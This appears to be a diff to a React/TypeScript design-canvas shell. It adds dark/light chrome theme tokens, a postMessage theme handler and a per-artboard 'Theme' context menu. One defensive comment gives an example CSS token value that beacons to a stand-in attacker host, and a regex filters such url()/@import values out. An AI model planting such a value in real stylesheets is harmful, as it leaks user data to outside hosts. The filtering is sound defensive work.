@@ -98,25 +98,63 @@ import { useUndoStack } from './use-undo-stack.tsx';
 // plane would otherwise scale a 2 px outline to 0.84 px at 42 % zoom (subpixel
 // = invisible). No per-element class stamping is used.
 
-// HUD-namespace token block. System-review 2026-05-27 (D-4) flagged that the
+// HUD / chrome token block. System-review 2026-05-27 (D-4) flagged that the
 // dev-server chrome (toolbar + minimap + halos + marquee + AI banner) used
 // `var(--accent, …)` which inherited the canvas DS palette — a violet StudyFi
 // canvas turned the floating cursor toolbar violet. The HUD owns its own
 // `--maude-hud-*` token family, set on `:root` of the canvas iframe document
-// here. Canvas DSs do NOT define `--maude-hud-*`, so HUD CSS resolves against
-// this block regardless of what the imported `:root { --accent: … }` looks like.
+// here. Canvas DSs do NOT define these names, so HUD/chrome CSS resolves
+// against this block regardless of what the imported `:root { --accent: … }`
+// looks like.
 //
-// Defaults match the existing inline fallback color (`#d63b1f`, Maude brand
-// orange-rust) so no visual change to the default theme. Users who want to
-// re-theme the HUD can set `--maude-hud-accent` etc. via a `<style>` block
-// AFTER this one (CSS cascade — later wins).
+// Two sub-families:
+//   • `--maude-hud-accent*` — theme-agnostic brand orange-rust. Defaults match
+//     the existing inline fallback (`#d63b1f`) so the accent never changes with
+//     the theme. Users who want to re-theme the HUD can set these via a
+//     `<style>` block AFTER this one (CSS cascade — later wins).
+//   • `--maude-chrome-*` — NEUTRAL surface/text/border family that DOES follow
+//     the Maude chrome theme (system-review 2026-05-28 D9). The whole canvas-
+//     shell chrome (workspace plane, dotted grid, floating toolbar, minimap,
+//     zoom HUD, popovers, halos, context menu, undo HUD, presence chrome) reads
+//     these instead of the DS `--bg-*`/`--fg-*` palette, so the chrome flips
+//     dark↔light with the rest of the dev-server while ARTBOARDS keep the theme
+//     their design system defines. The set is selected by a `data-maude-theme`
+//     attribute on the iframe `documentElement`, propagated over the existing
+//     `dgn:*` postMessage bridge (see CanvasRouter onMessage + app.jsx).
+//
+// Values mirror the Maude app-chrome neutrals (client/styles/1-tokens.css) so
+// the in-iframe chrome and the outer shell read as one product. The DARK set is
+// also the default (attribute absent / "dark") so a canvas that never receives
+// a theme message renders coherent-dark — matching the dev-server's own default
+// theme (readInitialTheme() → 'dark'). DDR — mirrors the `--maude-hud-*`
+// precedent; the `data-maude-theme` attribute is deliberately SEPARATE from the
+// DS `data-theme` so chrome theming never touches artboard palettes.
 const HUD_TOKENS_CSS = `
-:root {
+:root,
+:root[data-maude-theme="dark"] {
   --maude-hud-accent:        #d63b1f;
   --maude-hud-accent-hover:  #b8331b;
   --maude-hud-accent-active: #962a16;
   --maude-hud-accent-fg:     #ffffff;
   --maude-hud-accent-tint:   color-mix(in oklab, #d63b1f 14%, transparent);
+
+  --maude-chrome-bg-0:      oklch(13% 0.012 60);
+  --maude-chrome-bg-1:      oklch(17% 0.014 60);
+  --maude-chrome-bg-2:      oklch(20% 0.016 60);
+  --maude-chrome-fg-0:      oklch(94% 0.014 80);
+  --maude-chrome-fg-1:      oklch(78% 0.014 80);
+  --maude-chrome-border:    oklch(28% 0.018 60);
+  --maude-chrome-shadow:    rgba(0, 0, 0, 0.45);
+  --maude-chrome-font-mono: 'Berkeley Mono', 'TX-02', 'JetBrains Mono', 'IBM Plex Mono', ui-monospace, SFMono-Regular, Menlo, monospace;
+}
+:root[data-maude-theme="light"] {
+  --maude-chrome-bg-0:   oklch(97.5% 0.008 78);
+  --maude-chrome-bg-1:   oklch(95.5% 0.010 78);
+  --maude-chrome-bg-2:   oklch(93.0% 0.012 78);
+  --maude-chrome-fg-0:   oklch(20% 0.020 50);
+  --maude-chrome-fg-1:   oklch(38% 0.018 50);
+  --maude-chrome-border: oklch(86% 0.014 70);
+  --maude-chrome-shadow: color-mix(in oklab, oklch(20% 0.020 50) 14%, transparent);
 }
 `;
 
@@ -138,7 +176,7 @@ const HALO_CSS = `
    elements. NO ring, NO ticks. Synchronous paint (no debounce). */
 .dc-cv-halo--hover {
   border: 1.5px solid color-mix(in oklab, var(--maude-hud-accent, #0d99ff) 60%, transparent);
-  box-shadow: inset 0 0 0 1px var(--bg-0, #ffffff);
+  box-shadow: inset 0 0 0 1px var(--maude-chrome-bg-0, #ffffff);
 }
 /* Selected (single) — 2px solid + 18% ring halo + 4 filled corner ticks.
    Ticks are <i class="tick tick-*"> children at inset:-3px, 8x8, accent fill. */
@@ -152,7 +190,7 @@ const HALO_CSS = `
   height: 8px;
   background: var(--maude-hud-accent, #0d99ff);
   border-radius: 1px;
-  box-shadow: 0 0 0 1px var(--bg-0, #ffffff);
+  box-shadow: 0 0 0 1px var(--maude-chrome-bg-0, #ffffff);
 }
 .dc-cv-halo--selected .tick-tl { top: -3px; left: -3px; }
 .dc-cv-halo--selected .tick-tr { top: -3px; right: -3px; }
@@ -186,7 +224,7 @@ const HALO_CSS = `
   height: 6px;
   background: var(--maude-hud-accent, #0d99ff);
   border-radius: 1px;
-  box-shadow: 0 0 0 1px var(--bg-0, #ffffff);
+  box-shadow: 0 0 0 1px var(--maude-chrome-bg-0, #ffffff);
 }
 .dc-cv-group-bbox .tick-tl { top: -3px; left: -3px; }
 .dc-cv-group-bbox .tick-tr { top: -3px; right: -3px; }
@@ -313,6 +351,23 @@ export function CanvasShell({
   children: ReactNode;
 }) {
   ensureHaloStyles();
+
+  // D9 — "Follow chrome" artboards. When the chrome theme flips (the theme
+  // postMessage handler in CanvasRouter updates `data-maude-theme` on <html>),
+  // re-point every artboard the user marked as a follower at the new theme.
+  // A single observer per canvas (cleaned up on unmount) — no per-artboard
+  // listeners to leak. The override itself is a CSS rule keyed by data-dc-screen
+  // (see setArtboardTheme), so it survives React re-renders without flicker.
+  useEffect(() => {
+    if (typeof MutationObserver === 'undefined' || typeof document === 'undefined') return;
+    const obs = new MutationObserver(() => applyArtboardFollowers());
+    obs.observe(document.documentElement, {
+      attributes: true,
+      attributeFilter: ['data-maude-theme'],
+    });
+    return () => obs.disconnect();
+  }, []);
+
   // ToolProvider is mounted by DesignCanvas one level up (so the viewport
   // controller's `isPanDragActive` predicate can read the live tool state).
   // SelectionSetProvider is mounted via MaybeSelectionSetProvider — the shell-
@@ -660,6 +715,194 @@ function CanvasCore({
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
+// Per-artboard theme override (D9). The canvas-shell CHROME follows the Maude
+// theme via `data-maude-theme`; ARTBOARDS keep their DS theme by default. This
+// block backs the right-click `Theme ▸ DS default / Light / Dark / Follow
+// chrome` submenu — it re-themes a single artboard by stamping its
+// `.dc-artboard` <article> with the DS's theme-wrapper convention.
+//
+// DS theme-wrapper conventions vary (`.mdcc[data-theme]`, `.app[data-theme]`,
+// bare `[data-theme]`, …) and there's no reliable config flag, so we DETECT it
+// with a hidden computed-style probe: stamp a throwaway nested <div> with each
+// candidate `<class>[data-theme=light|dark]` and keep the first whose resolved
+// `--bg-0` differs between light and dark. Because the probe tests a NON-root
+// element, "supported" is exactly "stamping one artboard will work" — a DS that
+// only themes `:root[data-theme]` correctly reports unsupported (you genuinely
+// can't theme a single artboard there).
+
+interface DsThemeSupport {
+  supported: boolean;
+  /** The class the DS scopes its theme blocks to (`''` = bare `[data-theme]`). */
+  wrapperClass: string;
+}
+
+let _dsThemeSupport: DsThemeSupport | null = null;
+
+function detectDsThemeSupport(): DsThemeSupport {
+  if (_dsThemeSupport) return _dsThemeSupport;
+  const fallback: DsThemeSupport = { supported: false, wrapperClass: '' };
+  if (typeof document === 'undefined' || !document.body) return fallback;
+  try {
+    const host = document.createElement('div');
+    host.setAttribute('aria-hidden', 'true');
+    host.style.cssText =
+      'position:absolute;left:-9999px;top:0;width:0;height:0;overflow:hidden;pointer-events:none;';
+    document.body.appendChild(host);
+    const read = (cls: string, theme: string): string => {
+      const el = document.createElement('div');
+      if (cls) el.className = cls;
+      el.setAttribute('data-theme', theme);
+      host.appendChild(el);
+      const v = getComputedStyle(el).getPropertyValue('--bg-0').trim();
+      host.removeChild(el);
+      return v;
+    };
+    // Bare attribute first (cleanest), then the common class conventions.
+    let found = fallback;
+    for (const cls of ['', 'mdcc', 'app']) {
+      const light = read(cls, 'light');
+      const dark = read(cls, 'dark');
+      if (light && dark && light !== dark) {
+        found = { supported: true, wrapperClass: cls };
+        break;
+      }
+    }
+    document.body.removeChild(host);
+    _dsThemeSupport = found;
+    return found;
+  } catch {
+    return fallback;
+  }
+}
+
+// Why not just stamp `data-theme` on the `.dc-artboard` element? Two reasons,
+// both found the hard way: (1) React OWNS the artboard <article> + the canvas
+// content's `rootClass` wrapper — it reconciles their className/attrs back to
+// the JSX values on every re-render, wiping any imperative mutation; and (2)
+// the canvas content carries its OWN `rootClass[data-theme]` wrapper (the DS
+// default), which re-establishes the default tokens BELOW the artboard, so
+// setting `data-theme` on the outer article never reaches the content. The
+// robust mechanism is a single injected <style> keyed by the STABLE
+// `data-dc-screen` attribute (which React always re-renders WITH), re-declaring
+// the chosen theme's `--*` tokens scoped to the artboard's content wrapper.
+// Survives re-renders, beats the wrapper on cascade order, zero flicker.
+
+// Reject token VALUES that could turn the re-emitted <style> into a resource
+// fetch / exfil beacon. Per the CSS spec a custom-property value can't contain
+// an unmatched top-level `}` (so brace-breakout to other selectors is already
+// impossible), but `url()` / `image()` / `@import` / comments survive verbatim.
+// For a TRUSTED same-origin DS this is inert, but a DDR-054 untrusted synced
+// canvas could ship `--bg-0: #fff url(https://attacker/x?leak)` — copying it
+// here would fire that fetch when the artboard renders. Drop such values; the
+// token simply falls back to the DS default for that artboard. (Security
+// review F2, 2026-05-29 — defense-in-depth on top of the canvas-origin CSP.)
+const _UNSAFE_TOKEN_VALUE = /url\(|image\(|image-set\(|-image-set\(|@import|\/\*|expression\(/i;
+
+// Collect a DS theme block's custom-property declarations by scanning the
+// loaded stylesheets for top-level rules whose selector targets that theme.
+// Only `--*` props are copied (token re-definitions) — never layout/type, and
+// never @media-nested rules (e.g. the prefers-reduced-motion 1ms collapse).
+const _themeDecls: Partial<Record<'light' | 'dark', string>> = {};
+function collectThemeDeclarations(theme: 'light' | 'dark'): string {
+  const cached = _themeDecls[theme];
+  if (cached != null) return cached;
+  let decls = '';
+  if (typeof document !== 'undefined') {
+    for (const sheet of Array.from(document.styleSheets)) {
+      let rules: CSSRuleList | undefined;
+      try {
+        rules = sheet.cssRules;
+      } catch {
+        continue; // cross-origin / unreadable sheet
+      }
+      if (!rules) continue;
+      for (const rule of Array.from(rules)) {
+        if (!(rule instanceof CSSStyleRule)) continue;
+        if (!(rule.selectorText || '').includes(`[data-theme="${theme}"]`)) continue;
+        const style = rule.style;
+        for (let i = 0; i < style.length; i++) {
+          const prop = style[i];
+          if (!prop.startsWith('--')) continue;
+          const value = style.getPropertyValue(prop);
+          if (_UNSAFE_TOKEN_VALUE.test(value)) continue;
+          decls += `${prop}:${value};`;
+        }
+      }
+    }
+  }
+  _themeDecls[theme] = decls;
+  return decls;
+}
+
+const _artboardThemes = new Map<string, 'light' | 'dark'>();
+const _artboardFollowers = new Set<string>();
+
+function cssEsc(v: string): string {
+  return typeof CSS !== 'undefined' && CSS.escape ? CSS.escape(v) : v;
+}
+
+// Selector targeting the artboard's content wrapper (where the DS theme block
+// is re-established). Beats `.<wrapper>[data-theme="…"]` because the injected
+// <style> is appended after the DS stylesheet (later-wins on equal specificity).
+function artboardScopeSelector(screenId: string): string {
+  const { wrapperClass } = detectDsThemeSupport();
+  const base = `[data-dc-screen="${cssEsc(screenId)}"]`;
+  if (wrapperClass) {
+    const c = cssEsc(wrapperClass);
+    return `${base} .${c},${base}.${c}`;
+  }
+  return `${base} [data-theme],${base}[data-theme]`;
+}
+
+function rebuildArtboardThemeStyle(): void {
+  if (typeof document === 'undefined') return;
+  let el = document.getElementById('dc-artboard-theme-css') as HTMLStyleElement | null;
+  if (!el) {
+    el = document.createElement('style');
+    el.id = 'dc-artboard-theme-css';
+    document.head.appendChild(el);
+  }
+  let css = '';
+  for (const [screenId, theme] of _artboardThemes) {
+    const decls = collectThemeDeclarations(theme);
+    if (decls) css += `${artboardScopeSelector(screenId)}{${decls}}\n`;
+  }
+  el.textContent = css;
+}
+
+/** Current canvas-shell chrome theme (mirrors `data-maude-theme` on <html>). */
+function currentChromeTheme(): 'light' | 'dark' {
+  if (typeof document === 'undefined') return 'dark';
+  return document.documentElement.dataset.maudeTheme === 'light' ? 'light' : 'dark';
+}
+
+/**
+ * Set (or clear) a single artboard's theme override, keyed by its stable
+ * `data-dc-screen` id. `theme === null` → remove the override (DS default).
+ * `follow === true` → mirror the live chrome theme and keep tracking toggles.
+ */
+function setArtboardTheme(screenId: string, theme: 'light' | 'dark' | null, follow = false): void {
+  _artboardFollowers.delete(screenId);
+  if (follow) {
+    _artboardFollowers.add(screenId);
+    _artboardThemes.set(screenId, currentChromeTheme());
+  } else if (theme === null) {
+    _artboardThemes.delete(screenId);
+  } else {
+    _artboardThemes.set(screenId, theme);
+  }
+  rebuildArtboardThemeStyle();
+}
+
+/** Re-point every "Follow chrome" artboard at the current chrome theme. */
+function applyArtboardFollowers(): void {
+  if (_artboardFollowers.size === 0) return;
+  const t = currentChromeTheme();
+  for (const id of _artboardFollowers) _artboardThemes.set(id, t);
+  rebuildArtboardThemeStyle();
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
 // Registry builder — closes over controller + clear callback.
 
 function buildRegistry(deps: {
@@ -742,6 +985,56 @@ function buildRegistry(deps: {
       }
     },
   });
+
+  // D9 — per-artboard theme override, keyed by the stable `data-dc-screen` id
+  // (target.artboardId) via an injected stylesheet (see setArtboardTheme). The
+  // DS-supports-both probe gates the explicit Light/Dark entries; "DS default"
+  // + "Follow chrome" are always available.
+  const themeSupport = detectDsThemeSupport();
+  const themeHint = 'This design system defines only one theme';
+  const themeItem: MenuItem = {
+    id: 'theme',
+    label: 'Theme',
+    onSelect: () => {
+      /* parent of a submenu — never invoked directly */
+    },
+    submenu: [
+      {
+        id: 'theme-ds-default',
+        label: 'DS default',
+        onSelect: (target) => {
+          if (target.artboardId) setArtboardTheme(target.artboardId, null);
+        },
+      },
+      {
+        id: 'theme-light',
+        label: 'Light',
+        disabled: !themeSupport.supported,
+        disabledHint: themeHint,
+        onSelect: (target) => {
+          if (target.artboardId) setArtboardTheme(target.artboardId, 'light');
+        },
+      },
+      {
+        id: 'theme-dark',
+        label: 'Dark',
+        disabled: !themeSupport.supported,
+        disabledHint: themeHint,
+        onSelect: (target) => {
+          if (target.artboardId) setArtboardTheme(target.artboardId, 'dark');
+        },
+      },
+      {
+        id: 'theme-follow',
+        label: 'Follow chrome',
+        disabled: !themeSupport.supported,
+        disabledHint: themeHint,
+        onSelect: (target) => {
+          if (target.artboardId) setArtboardTheme(target.artboardId, null, true);
+        },
+      },
+    ],
+  };
 
   return {
     element: [
@@ -868,6 +1161,7 @@ function buildRegistry(deps: {
           onSelect: () => distributeArtboards('y'),
         },
       ],
+      [themeItem],
       [exportItem('export-artboard', 'Export this artboard…', 'artboard')],
     ],
     world: [
@@ -944,6 +1238,13 @@ function CanvasRouter({
   // user closes the composer.
   useEffect(() => {
     if (typeof window === 'undefined') return;
+    // Default the canvas-shell chrome theme to dark (matches the dev-server's
+    // own default + the bare `:root` --maude-chrome-* set) so a canvas that
+    // never receives a `dgn:'theme'` message still renders coherent-dark and
+    // the follow-chrome observer (Task 5) has a concrete value to mirror.
+    if (!document.documentElement.dataset.maudeTheme) {
+      document.documentElement.dataset.maudeTheme = 'dark';
+    }
     const onMessage = (e: MessageEvent) => {
       const m = e.data as { dgn?: string } | null;
       if (!m || typeof m !== 'object' || !m.dgn) return;
@@ -956,6 +1257,19 @@ function CanvasRouter({
       if (m.dgn === 'tool-set') {
         const t = (m as { tool?: string }).tool;
         if (typeof t === 'string') setTool(t as never);
+        return;
+      }
+      // D9 — canvas-shell chrome follows the Maude chrome theme. The chrome's
+      // `--maude-chrome-*` token family is keyed by `data-maude-theme` on the
+      // iframe documentElement (see HUD_TOKENS_CSS). This attribute is
+      // DELIBERATELY separate from the DS `data-theme`: it only re-themes the
+      // floating chrome, never the artboard palettes. Followers (per-artboard
+      // "Follow chrome") restamp via the MutationObserver in CanvasShell.
+      if (m.dgn === 'theme') {
+        const t = (m as { theme?: string }).theme;
+        if (t === 'light' || t === 'dark') {
+          document.documentElement.dataset.maudeTheme = t;
+        }
         return;
       }
     };
@@ -1085,14 +1399,14 @@ const MULTI_TOOLBAR_CSS = `
   align-items: stretch;
   gap: 2px;
   padding: 4px;
-  background: var(--u-bg-0, var(--bg-0, #ffffff));
-  border: 1px solid var(--u-fg-0, #1c1917);
+  background: var(--maude-chrome-bg-0, #ffffff);
+  border: 1px solid var(--maude-chrome-fg-0, #1c1917);
   border-radius: 8px;
-  box-shadow: 0 6px 24px color-mix(in oklab, var(--u-fg-0, #1c1917) 10%, transparent);
-  font-family: var(--u-font-mono, ui-monospace, SFMono-Regular, Menlo, monospace);
+  box-shadow: 0 6px 24px var(--maude-chrome-shadow, color-mix(in oklab, #1c1917 10%, transparent));
+  font-family: var(--maude-chrome-font-mono, ui-monospace, SFMono-Regular, Menlo, monospace);
   font-size: 11px;
   letter-spacing: 0.02em;
-  color: var(--u-fg-0, #1a1a1a);
+  color: var(--maude-chrome-fg-0, #1a1a1a);
   user-select: none;
 }
 .dc-multi-artboard-tb button {
@@ -1118,8 +1432,8 @@ const MULTI_TOOLBAR_CSS = `
 }
 .dc-multi-artboard-tb .dc-mab-count {
   padding: 4px 8px 4px 10px;
-  color: var(--fg-1, rgba(40,30,20,0.7));
-  border-right: 1px solid var(--u-border-subtle, rgba(0,0,0,0.08));
+  color: var(--maude-chrome-fg-1, rgba(40,30,20,0.7));
+  border-right: 1px solid var(--maude-chrome-border, rgba(0,0,0,0.08));
   margin-right: 2px;
   font-variant-numeric: tabular-nums;
 }
@@ -1131,7 +1445,7 @@ const MULTI_TOOLBAR_CSS = `
 .dc-multi-artboard-tb .dc-mab-divider {
   width: 1px;
   align-self: stretch;
-  background: var(--u-border-subtle, rgba(0,0,0,0.10));
+  background: var(--maude-chrome-border, rgba(0,0,0,0.10));
   margin: 0 4px;
 }
 @media (prefers-reduced-motion: reduce) {
